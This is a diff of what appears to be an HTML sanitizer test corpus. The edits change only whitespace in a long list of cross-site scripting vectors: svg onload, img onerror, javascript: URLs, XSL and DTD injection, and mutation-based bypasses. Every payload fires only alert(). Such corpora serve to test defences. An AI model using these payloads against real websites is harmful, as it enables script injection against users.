@@ -24,14 +24,11 @@
 
 <img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>
 
-<img src="
-data:image/jpeg,ab798ewqxbaudbuoibeqbla">
+<img src="data:image/jpeg,ab798ewqxbaudbuoibeqbla">
 
 <img src='javascript:while(1){}'>
 
-<a href=data:,evilnastystuff>clickme</a>
-
-123456
+<a href=data:,evilnastystuff>clickme</a>123456
 
 <form onmouseover='alert(1)'><input name="attributes"><input name="attributes">
 
@@ -96,7 +93,7 @@ data:image/jpeg,ab798ewqxbaudbuoibeqbla">
 
 <image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>
 
-<a href="javascript:alert(1)">@shafigullin<a>
+<a href="javascript:alert(1)">@shafigullin<a>
 
 <image name=activeElement><svg onload=alert(1)>
 
@@ -118,8 +115,7 @@ data:image/jpeg,ab798ewqxbaudbuoibeqbla">
 
 <a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>
 
-<form action="javasc
-ript:alert(1)"><button>XXX</button></form>
+<form action="javascript:alert(1)"><button>XXX</button></form>
 
 <div id="1"><form id="foobar"></form><button form="foobar" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div>
 
@@ -198,6 +194,7 @@ ript:alert(1)"><button>XXX</button></form>
 <![><img src="]><img src=x onerror=alert(39)//">
 
 <!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
+
 <svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
 
 <div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
@@ -269,15 +266,15 @@ ript:alert(1)"><button>XXX</button></form>
 <div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div><div id="66"><?xml version="1.0"?>
 
 <?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
-<root/>//["'`-->]]>]</div>
-<div id="67"><!DOCTYPE x [
-    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx"
- onerror CDATA "alert(67)"
- onload CDATA "alert(2)">
-]><img />//["'`-->]]>]</div>
+
+  <root/>//["'`-->]]>]</div>
+  
+<div id="67"><!DOCTYPE x [<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx"onerror CDATA "alert(67)"onload CDATA "alert(2)">]><img />//["'`-->]]>]</div>
 
 <div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">
-    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x>
+    
+<html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x>
+
 </doc>//["'`-->]]>]</div>
 
 <div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div>
@@ -313,31 +310,35 @@ ript:alert(1)"><button>XXX</button></form>
 <div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div>
 
 <div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div><div id="87"><svg xmlns="http://www.w3.org/2000/svg">
+
 <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
+
 </svg>//["'`-->]]>]</div>
 
 <div id="89"><svg xmlns="http://www.w3.org/2000/svg">
+
 <set attributeName="onmouseover" to="alert(89)"/>
+
 <animate attributeName="onunload" to="alert(89)"/>
+
 </svg>//["'`-->]]>]</div>
 
 <div id="90"><!-- Up to Opera 10.63 -->
+
 <div style=content:url(test2.svg)></div>
 
 <!-- Up to Opera 11.64 - see link below -->
 
 <!-- Up to Opera 12.x -->
+
 <div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>
 
 <div id="91">[A]
 <? foo="><script>alert(91)</script>">
 <! foo="><script>alert(91)</script>">
-</ foo="><script>alert(91)</script>">
-[B]
-<? foo="><x foo='?><script>alert(91)</script>'>">
-[C]
-<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
-[D]
+</ foo="><script>alert(91)</script>">[B]
+<? foo="><x foo='?><script>alert(91)</script>'>">[C]
+<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">[D]
 <% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
 
 <div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
@@ -622,8 +623,6 @@ XXX
 a<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;s>&lt/s>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">
 
 <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>">
-
- 
 
 <div><math></math></div>
 
